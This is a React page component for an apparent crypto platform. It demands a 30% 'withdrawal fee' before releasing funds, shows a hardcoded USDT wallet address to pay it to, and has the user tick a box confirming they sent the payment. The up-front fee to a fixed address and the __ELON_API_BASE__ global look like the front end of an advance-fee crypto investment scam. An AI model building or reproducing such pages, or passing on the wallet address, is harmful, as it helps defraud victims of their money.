import { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { useApi } from '../../../hooks/useApi';
import './WithdrawalFeeConfirmPage.css';

export default function WithdrawalFeeConfirmPage() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { loading } = useApi();
  const [withdrawal, setWithdrawal] = useState(null);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [confirmed, setConfirmed] = useState(false);

  // Get withdrawal data from URL params or state
  useEffect(() => {
    const amount = searchParams.get('amount');
    const currency = searchParams.get('currency');
    const id = searchParams.get('id');

    if (!amount || !currency) {
      setError('Missing withdrawal details. Please start a new withdrawal.');
      return;
    }

    const fee = parseFloat(amount) * 0.3;
    const total = parseFloat(amount) + fee;

    setWithdrawal({
      id: id || `WD-${Date.now()}`,
      amount: parseFloat(amount),
      currency,
      fee: parseFloat(fee.toFixed(8)),
      total: parseFloat(total.toFixed(8)),
      feeAddress: '0xd36e85873f91120785D3090Af4fE00d1050720c0',
      status: 'REQUIRED',
    });
  }, [searchParams]);

  const handleConfirmPayment = async () => {
    if (!confirmed) {
      setError('Please confirm that you have sent the fee payment');
      return;
    }

    try {
      const API_BASE = import.meta.env.VITE_API_URL || window?.__ELON_API_BASE__ || '/api';
      const response = await fetch(API_BASE + '/withdrawals/confirm-fee', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${localStorage.getItem('token')}`,
        },
        body: JSON.stringify({
          withdrawalId: withdrawal.id,
          amount: withdrawal.total,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        setError(data.message || 'Failed to confirm fee payment');
        return;
      }

      setSuccess('Fee payment confirmed! Your withdrawal is being processed.');
      setTimeout(() => {
        navigate('/transactions?tab=withdrawals');
      }, 2000);
    } catch (err) {
      setError(err.message || 'Network error');
    }
  };

  if (!withdrawal) {
    return (
      <div className="fee-confirm-container">
        <div className="fee-confirm-card">
          {error && <div className="alert alert-error">{error}</div>}
        </div>
      </div>
    );
  }

  return (
    <div className="fee-confirm-container">
      <div className="fee-confirm-card">
        <div className="fee-header">
          <h1>Withdrawal Fee Confirmation</h1>
          <p className="fee-subtitle">
            A 30% fee is required before your withdrawal can be processed
          </p>
        </div>

        {error && <div className="alert alert-error">{error}</div>}
        {success && <div className="alert alert-success">{success}</div>}

        <div className="fee-details">
          <div className="fee-row">
            <span className="label">Withdrawal ID</span>
            <span className="value">{withdrawal.id}</span>
          </div>
          <div className="fee-row">
            <span className="label">Amount</span>
            <span className="value">
              {withdrawal.amount.toFixed(8)} {withdrawal.currency}
            </span>
          </div>
          <div className="fee-row">
            <span className="label">Fee (30%)</span>
            <span className="value accent">
              {withdrawal.fee.toFixed(8)} {withdrawal.currency}
            </span>
          </div>
          <div className="fee-row divider">
            <span className="label">Total to Pay</span>
            <span className="value total">
              {withdrawal.total.toFixed(8)} {withdrawal.currency}
            </span>
          </div>
          <div className="fee-row">
            <span className="label">Status</span>
            <span className="status-badge status-required">{withdrawal.status}</span>
          </div>
        </div>

        <div className="fee-section">
          <h3>Send fee to this USDT address</h3>
          <div className="address-box">
            <code>{withdrawal.feeAddress}</code>
            <button
              type="button"
              className="btn-copy"
              onClick={() => {
                navigator.clipboard.writeText(withdrawal.feeAddress);
              }}
            >
              Copy Address
            </button>
          </div>
          <p className="address-hint">Send exactly {withdrawal.fee.toFixed(8)} USDT to this address</p>
        </div>

        <div className="fee-section">
          <label className="confirm-checkbox">
            <input
              type="checkbox"
              checked={confirmed}
              onChange={(e) => setConfirmed(e.target.checked)}
            />
            <span>I confirm that I have sent the fee payment to the address above</span>
          </label>
        </div>

        <div className="fee-actions">
          <button
            type="button"
            className="btn btn-secondary"
            onClick={() => navigate('/withdrawals')}
          >
            Cancel
          </button>
          <button
            type="button"
            className="btn btn-primary"
            onClick={handleConfirmPayment}
            disabled={!confirmed || loading}
          >
            {loading ? 'Confirming...' : 'Confirm Payment Sent'}
          </button>
        </div>

        <div className="fee-info">
          <p className="info-title">Important</p>
          <ul>
            <li>Send exactly the fee amount shown above</li>
            <li>Use only USDT (ERC-20 standard)</li>
            <li>Double-check the address before sending</li>
            <li>Allow 5-10 minutes for confirmation</li>
          </ul>
        </div>
      </div>
    </div>
  );
}
